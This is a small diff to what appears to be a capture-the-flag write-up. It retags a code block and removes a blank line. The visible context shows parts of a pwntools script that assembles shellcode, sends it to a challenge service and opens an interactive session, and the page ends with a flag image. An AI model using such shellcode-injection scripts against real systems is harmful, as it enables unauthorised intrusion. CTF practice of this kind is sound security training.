@@ -11,7 +11,7 @@
 
 
 
-```
+```js
 from pwn import *
 
 #p = process('./shellcode')
@@ -44,7 +44,6 @@ shellcode = asm('\n'.join([
 r.recvuntil(b'PhaPhaKhongCoDon.txt\n')
 r.sendline(shellcode)
 r.interactive()
-
 ```
 
 ![flag](images/flag.png)
